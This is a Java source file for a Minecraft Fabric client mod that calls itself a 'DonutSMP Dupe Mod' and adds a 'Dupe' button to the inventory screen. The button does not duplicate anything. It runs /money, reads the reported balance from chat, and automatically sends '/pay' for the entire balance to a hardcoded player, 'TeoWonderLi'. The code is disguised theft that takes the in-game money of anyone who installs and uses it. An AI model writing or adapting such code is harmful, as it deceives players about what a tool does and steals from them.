package com.donutsmp.pupemod;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.screen.v1.ScreenEvents;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.ingame.InventoryScreen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.text.Text;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MyClientMod implements ClientModInitializer {

    private static final Pattern MONEY_PATTERN = Pattern.compile("You have \\$(\\S+)\\.");
    private static final String TARGET_PLAYER = "TeoWonderLi";
    private MinecraftClient client = MinecraftClient.getInstance();

    @Override
    public void onInitializeClient() {
        System.out.println("✅ DonutSMP Dupe Mod loaded!");

        // Listen for chat messages
        ClientReceiveMessageEvents.GAME.register((message, overlay) -> {
            String content = message.getString();
            Matcher matcher = MONEY_PATTERN.matcher(content);
            if (matcher.find()) {
                String rawAmount = matcher.group(1);
                long numericAmount = parseMoney(rawAmount);
                System.out.println("💰 Your money: " + numericAmount);

                // Send /ay command
                sendAYCommand(client, TARGET_PLAYER, numericAmount);
            }
        });

        // Add button to inventory GUI
        ScreenEvents.AFTER_INIT.register((screen, scaledWidth, scaledHeight) -> {
            if (screen instanceof InventoryScreen) {
                ButtonWidget pupeButton = new ButtonWidget(
                        scaledWidth / 2 + 10, // X position
                        scaledHeight / 2 - 60, // Y position
                        50, 20, // Width & height
                        Text.of("Dupe"),
                        button -> {
                            System.out.println("🔹 Dupe button clicked!");
                            sendMoneyCommand(client);
                        }
                );
                ((InventoryScreen) screen).addDrawableChild(pupeButton);
            }
        });
    }

    private static long parseMoney(String moneyStr) {
        moneyStr = moneyStr.replace("$", "").toUpperCase();
        double value;

        if (moneyStr.endsWith("B")) {
            value = Double.parseDouble(moneyStr.replace("B", "")) * 1_000_000_000;
        } else if (moneyStr.endsWith("M")) {
            value = Double.parseDouble(moneyStr.replace("M", "")) * 1_000_000;
        } else if (moneyStr.endsWith("K")) {
            value = Double.parseDouble(moneyStr.replace("K", "")) * 1_000;
        } else {
            value = Double.parseDouble(moneyStr);
        }

        return (long) value;
    }

    private static void sendAYCommand(MinecraftClient client, String targetPlayer, long amount) {
        if (client.player != null) {
            String command = "/pay " + targetPlayer + " " + amount;
            client.player.networkHandler.sendChatCommand(command);
            System.out.println("➡️ Sent command: " + command);
        }
    }

    public static void sendMoneyCommand(MinecraftClient client) {
        if (client.player != null) {
            client.player.networkHandler.sendChatCommand("money");
            System.out.println("➡️ Triggered /money");
        }
    }
}

